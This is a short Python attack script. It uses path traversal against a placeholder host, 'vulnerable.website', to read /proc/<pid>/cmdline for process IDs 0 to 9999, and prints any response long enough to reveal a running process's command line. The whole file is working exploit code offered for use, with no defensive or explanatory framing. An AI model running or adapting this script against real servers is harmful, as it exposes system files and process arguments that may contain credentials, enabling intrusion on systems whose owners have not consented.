import requests
import re


print("Running: ") 
for x in range(0,10000):

	url = "http://vulnerable.website/../../../../../../proc/"+ str(x) +"/cmdline"
	r = requests.get(url)
	length_of_resp = len(r.content)
	content = r.content
	
	if (length_of_resp > 150):
		print("FOUND PROCESS") 
		print("URL:" + r.url) 	
		print("Length:" + str(length_of_resp))
		print("Result:", re.split("/cmdline/" , str(content) ) )
		print("#####################################\n") 
